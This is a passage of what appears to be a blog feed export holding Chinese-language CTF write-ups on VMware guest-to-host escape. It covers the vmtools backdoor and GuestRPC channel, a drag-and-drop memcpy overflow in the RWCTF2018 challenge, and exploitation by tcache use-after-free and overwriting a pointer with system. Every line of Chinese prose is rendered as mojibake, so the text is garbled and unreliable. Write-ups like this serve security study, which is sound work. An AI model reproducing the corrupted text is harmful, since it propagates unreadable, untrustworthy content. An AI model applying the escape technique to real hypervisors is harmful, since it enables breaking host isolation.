alt="å›¾ç‰‡.png"></p><p>chunkè¢«æŒ‚è¿›äº†tcacheï¼Œç„¶åä¸‹ä¸€æ­¥æ‰§è¡Œdnd_versionåº”è¯¥ä¼šæŠŠchunkå–å‡ºï¼Œç„¶åæŠŠè™šè¡¨æŒ‡é’ˆå†™å…¥ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-3af68edeb6ac636b641ed4f28699a57cf02635d0.png" alt="å›¾ç‰‡.png"></p><p>æˆåŠŸå†™å…¥ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ”¹å†™systemçš„è¿‡ç¨‹ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fbcde0816cf86bb685d83ddcd650d26b20807683.png" alt="å›¾ç‰‡.png"><br> channel 0çš„ç¬¬ä¸€æ¬¡freeï¼Œè®°ä½chunkåœ°å€ï¼Œ0x7fa59c028e20ï¼Œç„¶åå’Œleakä¸€çœ¼ï¼Œå¯¹channel 1çš„UAFã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b5c0c0dd42f4ab7ab018faf0a5ff2962d73667f5.png" alt="å›¾ç‰‡.png"></p><p>åŠ«æŒæˆåŠŸï¼Œä½†æ˜¯æ­¤æ—¶tcacheä¸­å´çœ‹ä¸åˆ°ï¼Œå¯èƒ½heapinfoæœ‰ç‚¹é—®é¢˜ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-08e8e166fe38c1669ae4f225b82c46399d34c220.png" alt="å›¾ç‰‡.png"></p><p>è®¡ç®—åç§»åï¼Œç›®æ ‡ä½ç½®è¢«æ‰“å…¥tcacheçš„fdä¸­ï¼Œç„¶åå°±æ˜¯å¸¸è§„åˆ©ç”¨ã€‚æŠŠè¯¥å†…å­˜mallocå‡ºæ¥ã€‚ç„¶åå†™å…¥system</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-babc2811b8fd15b84ebcde28aab4e8a3ad4d017e.png" alt="å›¾ç‰‡.png"></p><p>æˆåŠŸå†™å…¥systemï¼Œç»§ç»­æ‰§è¡Œï¼Œç„¶åå¼¹å‡ºè®¡ç®—å™¨ã€‚<br> <img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b49b8f237dd3d59e57968a503942f5b52a884c87.png" alt="å›¾ç‰‡.png"></p><h2 id="0x05-æ€è€ƒ"><a href="#0x05-æ€è€ƒ" class="headerlink" title="0x05 æ€è€ƒ"></a>0x05 æ€è€ƒ</h2><p>emmï¼Œè°ƒè¯•æ€»æ˜¯é‡åˆ°ä¸€äº›é—®é¢˜ï¼Œæœ‰æ—¶å€™æŒ‚ä¸Šgdbï¼Œleakå‡ºæ¥çš„åŸºå€å°±ä¸å¯¹äº†ã€‚ã€‚ã€‚ç¦»è°±ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚æƒ³åˆ°çš„åŠæ³•æ˜¯ï¼Œå…ˆå‘é€å®Œpayloadï¼Œç„¶åå†attachä¸Šå»ï¼Œexpå’Œleakéƒ¨åˆ†åˆ†å¼€è°ƒè¯•ã€‚</p><p>è¿˜æœ‰è™šæ‹Ÿæœºçš„vmxï¼Œç§»åŠ¨çš„æ—¶å€™ï¼Œæƒé™å…³ç³»ï¼Œå¯èƒ½å¯¼è‡´æ‰“ä¸å¼€è™šæ‹Ÿæœºï¼Œåªæœ‰ä½¿ç”¨sudo  vmwareæ‰å¯ä»¥æ‰“å¼€ï¼Œä¸è¿‡è¿™æ ·æ‰“å¼€çš„è™šæ‹Ÿæœºï¼Œæœ€åå¯ä»¥æˆåŠŸleakå’Œæ‰§è¡Œï¼Œä½†æ˜¯å¼¹ä¸å‡ºè®¡ç®—å™¨ï¼Œä¹Ÿå°±æ˜¯å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼ŒæŠ¥é”™æŠ¥äº†è™šæ‹ŸåŒ–é”™è¯¯ï¼Œæäº†å¥½ä¹…æ²¡è§£å†³ï¼Œæœ€åä¹Ÿæ˜¯è«åå…¶å¦™çš„çªç„¶è§£å†³äº†ã€‚</p><p>ä¸¤ä¸ªvmç±»å‹çš„è™šæ‹Ÿæœºé€ƒé€¸æ”¶è·å¾ˆå¤§ï¼Œé€†å‘çš„åŸºç¡€ç‰¢å›ºäº†è®¸å¤šï¼Œrealworldç±»çš„é¢˜ç›®å’ŒCTFè¿˜æ˜¯æœ‰å¾ˆå¤šå·®åˆ«ï¼Œå‰è€…éœ€è¦å¾ˆå¥½çš„é€†å‘åŠŸåº•å’Œå¯¹ç›®æ ‡çš„ç†Ÿæ‚‰ï¼Œåè€…æ›´å¤šæ˜¯æŠ€å·§ä¸Šçš„åˆ©ç”¨ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>realworld</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è™šæ‹Ÿæœºé€ƒé€¸ï¼ˆä¸€ï¼‰</title>
    <link href="/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡é¦–å‘äºå¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº ï¼š <a href="https://forum.butian.net/share/1666">https://forum.butian.net/share/1666</a></p></blockquote><h2 id="0x01-æ¦‚è¿°"><a href="#0x01-æ¦‚è¿°" class="headerlink" title="0x01 æ¦‚è¿°"></a>0x01 æ¦‚è¿°</h2><p>è™šæ‹ŸåŒ–æŠ€æœ¯é€æ¸çš„å¼€æºå’Œäº‘è®¡ç®—çš„éœ€è¦ï¼Œä½¿å¾—è™šæ‹ŸåŒ–è¿…é€Ÿå‘å±•ï¼Œä»KVMï¼ŒXENåˆ°qemuï¼Œdockerâ€¦ç­‰ï¼Œã€‚</p><p>æœåŠ¡å’Œè½¯ä»¶å®šä¹‰ç½‘ç»œçš„ç†å¿µæ¨¡ç³Šäº†å¼€å‘å’Œè¿ç»´çš„ç•Œé™ï¼Œä¹ŸæŠŠæ›´å¤šçš„å®‰å…¨é—®é¢˜å¸¦å…¥åˆ°è™šæ‹ŸåŒ–æŠ€æœ¯ä¸­ã€‚æ›´å¤šåŸºç¡€è®¾æ–½å³æœåŠ¡ï¼ˆIaasï¼‰ç®¡ç†å¹³å°çš„é—®é¢˜ä»¥åŠäº‘ä¾›åº”å•†çš„ä¸å¯æ§éƒ½ç»™è™šæ‹ŸåŒ–æŠ€æœ¯çš„å®‰å…¨åº”ç”¨å¸¦æ¥é˜»ç¢ï¼Œè€ŒçœŸæ­£çš„è™šæ‹ŸåŒ–å®‰å…¨è¦ä»è™šæ‹ŸåŒ–æŠ€æœ¯æœ¬èº«è°ˆèµ·ã€‚</p><p>æ—©æœŸçš„è™šæ‹ŸåŒ–æå‡ºçš„æ˜¯ï¼Œå®¿ä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´çš„éš”ç¦»ï¼Œä½†æ˜¯éšç€æŠ€æœ¯çš„å‘å±•ï¼Œä¸¤æœºä¹‹é—´çš„é€šä¿¡è®©è¿™ç§éš”ç¦»å˜å¾—æ¨¡ç³ŠåŒ–ï¼Œæ— è®ºæ˜¯FTPè¿˜æ˜¯å…±äº«æœºåˆ¶ï¼Œéƒ½ç»™å®‰å…¨å¸¦æ¥çš„è¾ƒå¤§çš„æŒ‘æˆ˜ï¼Œæœ¬æ–‡é’ˆå¯¹è™šæ‹Ÿæœºé€ƒé€¸æ¼æ´è¿›è¡Œä¸€ä¸ªå…¥é—¨çº§åˆ«çš„åˆ†æã€‚</p><h2 id="0x02-å¦‚ä½•é€ƒé€¸"><a href="#0x02-å¦‚ä½•é€ƒé€¸" class="headerlink" title="0x02 å¦‚ä½•é€ƒé€¸"></a>0x02 å¦‚ä½•é€ƒé€¸</h2><p><strong>é¦–å…ˆï¼Œéœ€è¦æ˜ç¡®ææƒçš„æ¨¡å‹</strong>ï¼Œè™šæ‹Ÿæœºé€ƒé€¸çš„æƒ…å†µç¹å¤šï¼Œå¤§è‡´çš„æ¨¡å‹å’Œææƒæ–¹å¼éƒ½ç±»ä¼¼ã€‚ï¼ˆåç»­çš„ä¸€äº›ç¤ºä¾‹è¡¨ç¤ºï¼Œéå†…æ ¸æ€ä¹Ÿå¯ä»¥é€ƒé€¸ï¼‰</p><ul><li>è™šæ‹Ÿæœºæ“ä½œç³»ç»Ÿå‘é€æ•æ„Ÿè¯·æ±‚ï¼Œä½¿æ“ä½œç³»ç»Ÿé™·å…¥å†…æ ¸æ€</li><li>æŸäº›ç‰¹æƒæŒ‡ä»¤ä¼šè¿›å…¥ring0ä»¥ä¸‹çš„çŠ¶æ€ï¼Œå³äº¤ç»™<code>Hypervisor</code>å¤„ç†</li><li>åˆ©ç”¨Hypervisorçš„è„†å¼±æ€§æ¼æ´ä½¿å¾—Hypervisoræ‰§è¡Œå®Œç‰¹æƒæŒ‡ä»¤åä¸äº§ç”ŸæŒ‡ä»¤çŠ¶æ€çš„è¿”å›ï¼Œä½¿å¾—æ‰§è¡Œå®ŒæŒ‡ä»¤åä¾ç„¶åœç•™åœ¨å†…æ ¸æ€</li><li>å®ç°äº†ææƒåï¼Œå¯ä»¥æ¸—é€åˆ°Hypervisorå’Œè™šæ‹Ÿæœºçš„å…¶ä»–åŒºåŸŸï¼Œç ´åè™šæ‹ŸåŒ–çš„éš”ç¦»æœºåˆ¶ï¼Œå®Œæˆé€ƒé€¸æ“ä½œã€‚</li></ul><p><strong>äº†è§£åŸºæœ¬çš„æµç¨‹ä¹‹åï¼Œå°±æ˜¯ç†è§£</strong>ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/06/11/55bab3ee7a10d74b.png" alt="img"><br> ä»¥ä¸Šæ˜¯ä¸€ä¸ªè™šæ‹ŸåŒ–çš„åŸºæœ¬æ¨¡å‹ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯ä¸€ä¸ªå…¨è™šæ‹ŸåŒ–çš„æ¨¡å‹ï¼ŒVMMå³hypervisorï¼Œææƒåˆ©ç”¨çš„æ˜¯ç‰¹æ®ŠæŒ‡ä»¤æ‰§è¡Œæ—¶å€™ä¼šé™·å…¥root modeã€‚</p><p>è¿™ç±»æŒ‡ä»¤çš„å­˜åœ¨è®©ææƒå’Œé€ƒé€¸å˜å¾—å¯è¡Œã€‚æ€»ç»“ä»¥ä¸Šæµç¨‹ï¼Œå†™å‡ºä¸€ä¸ªé€ƒé€¸éœ€è¦çš„åŸºæœ¬æ¡ä»¶ã€‚</p><ol><li>æœ‰æ¼æ´çš„å†…æ ¸ï¼Œå³æœ‰å¯ä»¥æ‰§è¡Œä½¿å¾—é™·å…¥hypervisorçš„æŒ‡ä»¤</li><li>æœ‰ä¸€æ¬¡åŒ¹é…çš„é€ƒé€¸ï¼Œç†è§£ä¸ºå¯ä»¥ä½¿å¾—å®¿ä¸»æœºå¼¹å‡ºä¸€ä¸ªè®¡ç®—å™¨</li></ol><p>ç¬¬äºŒç‚¹çš„åˆ©ç”¨ï¼Œåœ¨ä¸åŒçš„è™šæ‹ŸåŒ–æŠ€æœ¯ä¸­ï¼Œä¸ä¸€æ ·ï¼Œä¸‹é¢ä»¥VM wareçš„é€ƒé€¸ï¼Œåšä¸€ä¸ªç®€å•çš„ä¾‹å­ã€‚</p><h2 id="0x03-RWCTF2018-final-VMescape"><a href="#0x03-RWCTF2018-final-VMescape" class="headerlink" title="0x03 RWCTF2018 final VMescape"></a>0x03 RWCTF2018 final VMescape</h2><p>è¿™é¢˜æ˜¯RWCTF2018 finalï¼Œåšä¸€ä¸ªå…¥æ‰‹çš„é¢˜ç›®éå¸¸çš„åˆé€‚ã€‚</p><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><p>ç»å¸¸ä½¿ç”¨vmwareè™šæ‹Ÿæœºçš„äººä¸€å®šä¼šç†Ÿæ‚‰å…¶æ‹–æ‹½åŠŸèƒ½ï¼Œå³Guestå’Œhostä¹‹é—´çš„æ–‡ä»¶ä¼ é€’ä»¥åŠå¤åˆ¶ä¹‹ç±»çš„æ“ä½œï¼Œéƒ½æ˜¯åŸºäºæ‹–æ‹½å®ç°çš„ï¼Œæ‹–æ‹½çš„èƒŒåæ˜¯Guestå’Œhostä¹‹é—´çš„é€šä¿¡æœºåˆ¶ã€‚è€ŒVmç±»å‹çš„é€ƒé€¸ä¸­ï¼Œåˆ©ç”¨çš„å°±æ˜¯è¯¥é€šä¿¡æœºåˆ¶ï¼Œè¿™ç±»æœºåˆ¶è¢«è®¾è®¡æ˜¯ç°åœ¨äº†vmtoolså½“ä¸­ï¼Œé«˜ç‰ˆæœ¬çš„vmwareï¼Œvmtoolsæ¶ˆå¤±ï¼Œç›´æ¥è¢«è‡ªå¸¦å®‰è£…ã€‚</p><h3 id="backdooræœºåˆ¶"><a href="#backdooræœºåˆ¶" class="headerlink" title="backdooræœºåˆ¶"></a>backdooræœºåˆ¶</h3><p>vmtoolsä¸­æœ‰ä¸€ä¸ªå«åšbackdoorçš„æ¥å£ï¼Œè¯¥æ¥å£è¢«ç”¨æ¥å®ç°é€šä¿¡ã€‚<a href="https://sites.google.com/site/chitchatvmback/backdoor">å®˜æ–¹æ–‡æ¡£</a>,githubä¸­çš„å¼€æºæ–‡æ¡£ä¹Ÿæœ‰<a href="https://github.com/vmware/open-vm-tools/blob/master/open-vm-tools/lib/backdoor/backdoorGcc64.c#L74-L104">open-vmtools</a>.</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span><span class="token function">Backdoor_InOut</span><span class="token punctuation">(</span>Backdoor_proto <span class="token operator">*</span>myBp<span class="token punctuation">)</span> <span class="token comment">// IN/OUT</span><span class="token punctuation">&#123;</span>   uint64 dummy<span class="token punctuation">;</span>   __asm__ <span class="token function">__volatile__</span><span class="token punctuation">(</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span>        <span class="token comment">/*         * Save %rbx on the stack because the Mac OS GCC doesn't want us to         * clobber it - it erroneously thinks %rbx is the PIC register.         * (Radar bug 7304232)         */</span>        <span class="token string">"pushq %%rbx"</span>           <span class="token string">"\n\t"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>        <span class="token string">"pushq %%rax"</span>           <span class="token string">"\n\t"</span>        <span class="token string">"movq 40(%%rax), %%rdi"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq 32(%%rax), %%rsi"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq 24(%%rax), %%rdx"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq 16(%%rax), %%rcx"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq  8(%%rax), %%rbx"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq   (%%rax), %%rax"</span> <span class="token string">"\n\t"</span>        <span class="token string">"inl %%dx, %%eax"</span>       <span class="token string">"\n\t"</span>  <span class="token comment">/* NB: There is no inq instruction */</span>        <span class="token string">"xchgq %%rax, (%%rsp)"</span>  <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rdi, 40(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rsi, 32(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rdx, 24(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rcx, 16(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rbx,  8(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"popq          (%%rax)"</span> <span class="token string">"\n\t"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span>        <span class="token string">"popq %%rbx"</span>            <span class="token string">"\n\t"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>å…¶ä¸­æœ‰ä¸€æ¡ç‰¹æƒæŒ‡ä»¤ï¼Œ<code>in</code>ï¼Œè¿™æ¡æŒ‡ä»¤åœ¨æ­£å¸¸çš„æ“ä½œç³»ç»Ÿæ‰§è¡Œä¼šæŠ¥é”™ï¼Œä½†æ˜¯åœ¨vmä¸­çš„guestæœºå™¨æ‰§è¡Œè¿™æ¡æŒ‡ä»¤ï¼Œè¿™ä¸ªå¼‚å¸¸ä¼šè¢« vmtoolsæ•è·ï¼Œç„¶åä¼ é€’ç»™<code>vmware-vmx.exe</code>è¿›è¡Œé€šä¿¡æ“ä½œã€‚</p><p><strong>é‡ç‚¹åœ¨äºï¼Œbackdooræ™®é€šç”¨æˆ·ä¹Ÿå¯ä»¥æ‰§è¡Œ</strong>ï¼Œæ‰€ä»¥ï¼Œguestä¸­ï¼Œæ‰§è¡Œç›¸åº”çš„ä»£ç ï¼Œè®©æ“ä½œç³»ç»Ÿé™·å…¥hypervisorå±‚ï¼Œç„¶åå†åˆ©ç”¨backdoorå’Œhostè¿›è¡Œé€šä¿¡ï¼Œè§¦å‘æ­¤bugã€‚</p><p>é€šä¿¡æ‰€éœ€è¦çš„å‡½æ•°ï¼Œå†open-vmtoolsä¸­ä¹Ÿæœ‰å®ç°ã€‚<code>Message_Send</code>å’Œ<code>Message_Recv</code>ã€‚<a href="https://github.com/vmware/open-vm-tools/blob/master/open-vm-tools/lib/message/message.c">gité“¾æ¥</a>ã€‚</p><p>åœ¨æŸä¸€ç¯‡<a href="http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml">æ–‡æ¡£</a>ä¸­ï¼Œç»™å‡ºäº†è¯¥æ“ä½œçš„åŸºæœ¬ä½¿ç”¨.</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">unsigned</span> <span class="token function">__declspec</span><span class="token punctuation">(</span>naked<span class="token punctuation">)</span> <span class="token function">GetMousePos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    __asm    <span class="token punctuation">&#123;</span>        mov eax<span class="token punctuation">,</span> <span class="token number">564</span>D5868h        mov ecx<span class="token punctuation">,</span> <span class="token number">4</span>        mov edx<span class="token punctuation">,</span> <span class="token number">5658</span>h        in eax<span class="token punctuation">,</span> dx        ret    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> mousepos <span class="token operator">=</span> <span class="token function">GetMousePos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span> <span class="token string">"é¼ æ ‡å…‰æ ‡ä½ç½®ï¼šx=%d,y=%d\n"</span> <span class="token punctuation">,</span> mousepos <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">,</span> mousepos <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><blockquote><p>If this program is executed on a real machine, the in instruction  will cause a â€œprivileged instructionâ€ exception, as user-mode code runs  in Ring 3. However, when this program is executed on the virtual  machine, it will print the correct mouse cursor position.</p><p>åœ¨çœŸæœºä¸Šä¼šæŠ¥é”™ï¼Œè€Œåœ¨è™šæ‹Ÿæœºä¸­ï¼Œå°†è·å¾—é¼ æ ‡ä½ç½®ã€‚</p></blockquote><h3 id="GuestRPC-Drag-and-Drop-RPCI"><a href="#GuestRPC-Drag-and-Drop-RPCI" class="headerlink" title="GuestRPC | Drag and Drop RPCI"></a>GuestRPC | Drag and Drop RPCI</h3><p>è¿™æ˜¯åœ¨backdooråŸºç¡€ä¸Šå®ç°çš„æ›´ä¸ºçµæ´»çš„é€šä¿¡æ–¹å¼ã€‚å•ä¸ª GuestRPC è°ƒç”¨ç”±ä¸€ç³»åˆ—è¯·æ±‚ç»„æˆï¼š</p><ul><li>æ‰“å¼€ GuestRPC é€šé“</li><li>å‘é€å‘½ä»¤é•¿åº¦</li><li>å‘é€å‘½ä»¤æ•°æ®</li><li>æ¥æ”¶å›å¤å¤§å°</li><li>æ¥æ”¶å›å¤æ•°æ®</li><li>å‘å‡ºæ¥æ”¶ç»“æŸä¿¡å·</li><li>å…³é—­é¢‘é“</li></ul><p>å…·ä½“çš„å‡½æ•°å®ç°åé¢å†å»åˆ†æï¼Œè¿™é‡Œå®é™…ä¸Šæ˜¯å®ç°äº†ä¸€å¥—ä¸é‚£ä¹ˆåº•å±‚çš„é€šä¿¡æœºåˆ¶ã€‚ä¾é è¿™ä¸ªæœºåˆ¶ï¼Œguestå’Œhostä¹‹é—´å¯ä»¥å®ç°è®¸å¤šæœ‰æ„æ€çš„æ“ä½œï¼Œä¾‹å¦‚ï¼šdndï¼ˆDrag n Dropï¼‰ã€cpï¼ˆCopy Pasteï¼‰æ“ä½œã€å‘é€æˆ–è·å–ä¿¡æ¯ç­‰ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/06/11/3a60818ae9d00e21.png" alt="img"></p><p>å†&#x2F;lib&#x2F;include&#x2F;rpcout.hä¸­å®šä¹‰äº†ç›¸å…³çš„ä¸€äº›å‡½æ•°ï¼Œè¿™äº›å‡½æ•°ç”¨æ¥æ„å»ºå’Œæ‘§æ¯rpcé€šé“ã€‚</p><p>æœ€åçš„è°ƒç”¨è¿½è¸ªå¦‚ä¸‹ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">Rpcout_start<span class="token operator">-></span>Message_OpenAllocated<span class="token operator">-></span>Backdoor<span class="token punctuation">;</span>RpcOut_send<span class="token operator">-></span>Message_Send  <span class="token operator">&amp;</span> Message_Receive<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>è¿™å‡ å¤„å‡½æ•°è°ƒç”¨å¯¹backdoorçš„æ“ä½œéƒ½æ˜¯åŸºäºä¸€ä¸ªç»“æ„ä½“ã€‚<code>Backdoor_proto</code></p><p>åœ¨<code>backdoor_types.h</code>ä¸­å¯¹å…¶æœ‰å®šä¹‰ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DECLARE_REG64_STRUCT</span> <span class="token punctuation">\</span>   <span class="token expression">DECLARE_REG32_STRUCT<span class="token punctuation">;</span> </span><span class="token punctuation">\</span>   <span class="token expression"><span class="token keyword">struct</span> <span class="token punctuation">&#123;</span> </span><span class="token punctuation">\</span>      <span class="token expression">uint32 low<span class="token punctuation">;</span> </span><span class="token punctuation">\</span>      <span class="token expression">uint32 high<span class="token punctuation">;</span> </span><span class="token punctuation">\</span>   <span class="token expression"><span class="token punctuation">&#125;</span> words<span class="token punctuation">;</span> </span><span class="token punctuation">\</span>   <span class="token expression">uint64 quad</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>å®é™…ä¸Šå°±æ˜¯å¯¹ç›¸åº”çš„å¯„å­˜å™¨åšä¸€ä¸ªè®¾ç½®ã€‚</p><p>é™¤äº†ä»¥ä¸Šçš„å‡½æ•°ï¼Œvmxè¿˜æä¾›äº†ä¸€ç§é¢å‘å¯¹è±¡çš„æ–¹æ³•å®ç°ä»¥ä¸ŠåŠŸèƒ½ï¼ŒVMWareRPCChannelç±»ï¼Œè¯¥ç±»å¯ä»¥åœ¨å†…æ ¸å’Œç”¨æˆ·æ¨¡å¼ä¸‹ä½¿ç”¨ã€‚</p><blockquote><p>By using <a href="http://kdvmware.sysprogs.org/dox/a00032.html">VMWareRPCChannel</a> class it is possible to execute arbitrary GuestRPC requests, that  VMWare supports. However, the question of adding our own request types  is still open. Letâ€™s examine the VMWARE-VMX.EXE internals. When a  GuestRPC is being issued by guest, code inside the VMWARE-VMX.EXE  searches the so-called GuestRPC handler table for a handler  corresponding the the issued request. A GuestRPC handler entry format  can be defined by the following structure:</p></blockquote><p>å…·ä½“çš„å®ç°è¿™é‡Œä¸èµ˜è¿°ï¼Œæ­¤å¤–é•¿äº­çš„å¸ˆå‚…ä¹Ÿå®ç°äº†ä¸€å¥—Rpcçš„é€šä¿¡æœºåˆ¶ï¼Œåœ¨å…¶çŸ¥ä¹æ–‡ç« æœ‰åˆ†æã€‚</p><p>é€šè¿‡è¿™ä¸ªRPCIå¯ä»¥ç›´æ¥å‘RPCï¼Œä»¥å¾€ç‰ˆæœ¬çš„æ¼æ´åˆ†æä¸­å·²ç»æœ‰è¯¥DnDæ¼æ´çš„å­˜åœ¨ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8c778cb84b93e2c11fe15cbc508a537bd365b3e7.png" alt="å›¾ç‰‡.png"><br> memcpyæ²¡æœ‰sizeçš„åˆ¤æ–­ï¼Œå¯¼è‡´ç¬¬äºŒä¸ªåŒ…å¯ä»¥ç›´æ¥æ”¹totalsizeä¸ºä¸€ä¸ªå¤§å€¼ï¼Œè¿™æ ·å¯¼è‡´äº†memcpyçš„æº¢å‡ºã€‚å‘é€Dndçš„ä»£ç åœ¨dndCPTransportGuestRpc.hppä¸­ï¼ŒåŒæ ·å¯ä»¥åœ¨open-vmtoolsé‡Œé¢æ‰¾åˆ°æºç ã€‚æœ‰äººæ€»ç»“å‡ºäº†å‘é€è·¯å¾„ã€‚</p><blockquote><p>rpcv3util::SendMsg-&gt;DnDCPTransportGuestRpc::SendPacket-&gt;RpcChannel_Send-&gt;Message_Send-&gt;backdoor</p></blockquote><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><h4 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h4><p>é¢˜ç›®ç»™å‡ºäº†</p><p>rwctf.ovfã€rwctf-disk1.vmdkã€rwctf.mfã€vmware-vmx-patchedã€VMware-Workstation-Full-15.0.2-10952284.x86_64.bundleå’Œvmware-vmx</p><p>ä½¿ç”¨vof vmdk mfå¯ä»¥åˆ›å»ºä¸€ä¸ªé¢˜ç›®ç›¸åŒç¯å¢ƒçš„è™šæ‹Ÿæœºï¼Œpatchedå³ä¸ºé¢˜ç›®ç¯å¢ƒçš„vmxï¼Œè€Œbundleå®‰è£…åŒ…ä¸­çš„æ˜¯ç»™å‡ºçš„vmware-vmxã€‚</p><p>ä½¿ç”¨bindiffæ¯”è¾ƒpatchedå’ŒåŸç‰ˆçš„ä¸åŒå¯ä»¥å¿«é€Ÿå®šä½æ¼æ´ä½ç½®ï¼Œbindiffå®˜ç½‘åœ¨å¤–ç½‘ï¼Œå¯ä»¥åœ¨52ç ´è§£ä¸‹è½½ã€‚</p><p>ä½¿ç”¨idaçš„bindiffæ’ä»¶ï¼Œç„¶åæŠŠdiffç»“æœå¯¼å…¥bindiffè½¯ä»¶å³å¯ã€‚</p><p>æŸ¥çœ‹å‡ºæ¥çš„ä¸åŒæœ‰1å¤„ï¼Œ</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d11ec0897a90dd8c3ffacd41ebf25d705c91d72f.png" alt="å›¾ç‰‡.png"><br> åŒå‡»æŸ¥çœ‹å‡½æ•°å†…å®¹</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-7d058ac9547b0c5f1d39ba965dd9b771c627d9fb.png" alt="å›¾ç‰‡.png"></p><p>å¯ä»¥çœ‹åˆ°patchedåœ°æ–¹åŠ å…¥äº†å¤§éƒ¨åˆ†çš„nopæŒ‡ä»¤ï¼Œå›åˆ°idaä»”ç»†åˆ†æè¯¥æµç¨‹å¤„nopæ‰çš„ä¸œè¥¿æ˜¯ä»€ä¹ˆã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-213799f6fc4e4063222b7f27d7ff3bf3d6a95b52.png" alt="å›¾ç‰‡.png"></p><p>ä»”ç»†æ¯”è¾ƒå‘ç°æœ‰ä¸€å¤„andè¢«ä¿®æ”¹ï¼Œè¿˜æœ‰ä¸€å¤„callä¹‹å‰çš„ä¸€ä¸ªmovæŒ‡ä»¤è¢«nopæ‰äº†ï¼ŒF5å›å»æŸ¥çœ‹è¢«æ”¹æ‰çš„ä½ç½®ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b60e6ffb7fa00eee453237c55f8b52c31cdb4593.png" 